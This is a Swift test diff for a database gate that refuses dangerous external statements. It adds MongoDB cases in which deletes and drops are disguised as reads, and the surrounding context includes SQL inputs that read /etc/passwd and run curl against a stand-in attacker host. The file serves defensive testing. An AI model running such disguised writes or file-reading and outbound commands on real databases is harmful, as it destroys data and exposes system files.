@@ -50,6 +50,29 @@ struct ExternalStatementGateTests {
         #expect(classification.tier == .safe)
     }
 
+    @Test("A MongoDB read passes a connection that is read only for external clients", arguments: [
+        #"db.c.aggregate([{"$match": {"k": {"$nin": ["x"]}}}])"#,
+        #"db.c.find({}, {"_id": 1}).limit(1)"#,
+        "db.getCollection(\"user-events\").find({}).toArray()"
+    ])
+    func mongoReadPassesReadOnlyAccess(sql: String) throws {
+        let classification = try ExternalStatementGate.classify(
+            statement(sql, databaseType: .mongodb, externalAccess: .readOnly)
+        )
+        #expect(classification.tier == .safe)
+    }
+
+    /// Each one deletes in the shell, and each one passed this gate as a read.
+    @Test("A MongoDB write dressed as a read is refused on read-only access", arguments: [
+        #"db.c.find(db.c[("delete"+"Many")]({}))"#,
+        "db.c.find(db.c.deleteMany ({}))",
+        #"db.c.find(__tp_exec('{"op":"delete","collection":"c","filter":"{}","multi":true}'))"#,
+        "--NaN+db.c.drop()\ndb.c.find({})"
+    ])
+    func disguisedMongoWriteRefused(sql: String) {
+        #expect(refusal(statement(sql, databaseType: .mongodb, externalAccess: .readOnly, allowsMultiStatement: true)) != nil)
+    }
+
     @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
         "COPY users FROM '/etc/passwd'",
         "COPY users TO PROGRAM 'curl attacker.example'",
